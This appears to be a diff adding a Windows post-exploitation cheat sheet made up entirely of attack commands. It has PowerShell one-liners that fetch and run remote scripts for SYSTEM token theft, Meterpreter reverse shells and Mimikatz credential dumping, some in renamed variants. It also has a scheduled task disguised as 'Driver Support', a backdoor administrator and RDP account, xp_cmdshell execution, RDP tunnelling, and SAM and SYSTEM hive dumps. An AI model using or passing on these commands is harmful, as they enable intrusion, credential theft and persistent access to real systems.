@@ -1,0 +1,36 @@
+powershell "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-TokenManipulation.ps1') ; Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'"
+
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokeholacode.ps1'); Invoke-Adios -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"
+
+powershell "IEX (New-Object Net.WebClient).DownloadString('file://C:/Users/Public/System/Invoke-Shellcode.ps1'); Invoke-Adios -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"
+
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1'); Invoke-Mimiadios -DumpCreds
+
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/commercial/master/wget.exe', 'C:\Support\wget.exe') }"
+
+schtasks /create /tn "Driver Support" /tr "cmd.exe /Q /C C:\Support\driver.bat" /sc DAILY /st 00:11 /f /RI 60 /du 24:00
+schtasks /Query /FO List /v /TN "Driver Support"
+
+osql.exe -S <server> -U <username> -P <password> -Q "xp_cmdshell 'whoami'"
+
+net localgroup administrators && net user username password /add && net localgroup administrators username /add && net localgroup "Remote Desktop Users" username /add
+
+net view
+net use q: \\share_name
+wmic logicaldisk get name
+net use q: /delete
+
+7za.exe a -tzip ipt.zip C:\support\
+
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL
+
+plink -l username -pw password -R 3389:192.168.1.2:3389 192.168.2.2 -P 22
+portfwd add -l 3389 -p 3389 -r 192.168.1.2
+
+reg save HKLM\SAM SAM
+reg save HKLM\SYSTEM SYSTEM
+
+query session /server:
+reset session 1
